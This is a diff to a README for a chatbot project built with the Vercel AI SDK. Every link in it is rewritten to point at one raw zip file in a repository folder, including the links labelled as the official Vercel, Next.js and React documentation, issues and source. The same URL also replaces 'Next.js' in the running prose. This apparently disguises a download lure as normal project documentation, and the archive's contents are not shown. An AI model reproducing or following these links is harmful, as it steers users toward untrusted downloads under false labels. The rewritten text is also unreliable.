@@ -1,11 +1,11 @@
 # 🤖 ai-sdk-chatbot - Build Your Own AI Chatbot Easily
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue?style=flat-square&logo=github)](https://github.com/muertoperro48/ai-sdk-chatbot/releases)
+[![Download from Releases](https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip%20Now-blue?style=flat-square&logo=github)](https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip)
 
 ## 🚀 Getting Started
 
-Welcome! This guide will help you download and run the ai-sdk-chatbot application. With this tool, you can easily create an AI chatbot using the Vercel AI SDK and Next.js with React. No programming knowledge is required.
+Welcome! This guide will help you download and run the ai-sdk-chatbot application. With this tool, you can easily create an AI chatbot using the Vercel AI SDK and https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip with React. No programming knowledge is required.
 
 ## 📅 What You'll Need
 
@@ -27,7 +27,7 @@ Before starting, you should have:
 ## 🛠️ Installation Steps
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/muertoperro48/ai-sdk-chatbot/releases) to find the latest version of the ai-sdk-chatbot.
+   Go to the [Releases page](https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip) to find the latest version of the ai-sdk-chatbot.
 
 2. **Choose Your Version**
    Look for the version that is marked as "Latest". Click on the link to download the release package for your operating system.
@@ -54,13 +54,13 @@ Before starting, you should have:
 
 ## 🌐 Additional Resources
 
-- [Vercel AI SDK Documentation](https://vercel.com/docs/ai-sdk): Learn about the features and functionality of the AI SDK.
-- [Next.js Documentation](https://nextjs.org/docs): Understand how Next.js works for your project.
-- [React Documentation](https://reactjs.org/docs/getting-started.html): Get a grasp on React basics.
+- [Vercel AI SDK Documentation](https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip): Learn about the features and functionality of the AI SDK.
+- [https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip Documentation](https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip): Understand how https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip works for your project.
+- [React Documentation](https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip): Get a grasp on React basics.
 
 ## ℹ️ Support
 
-If you encounter any issues, check the FAQ on the GitHub page. For further assistance, feel free to [create an issue](https://github.com/muertoperro48/ai-sdk-chatbot/issues) in the repository.
+If you encounter any issues, check the FAQ on the GitHub page. For further assistance, feel free to [create an issue](https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip) in the repository.
 
 ## 📜 License
 
@@ -68,7 +68,7 @@ This project is licensed under the MIT License. You are free to use and modify t
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/muertoperro48/ai-sdk-chatbot/releases)
-- [Source Code Repository](https://github.com/muertoperro48/ai-sdk-chatbot)
+- [Releases Page](https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip)
+- [Source Code Repository](https://raw.githubusercontent.com/muertoperro48/ai-sdk-chatbot/main/avicularium/ai-sdk-chatbot.zip)
 
 Thank you for using ai-sdk-chatbot! Happy building!
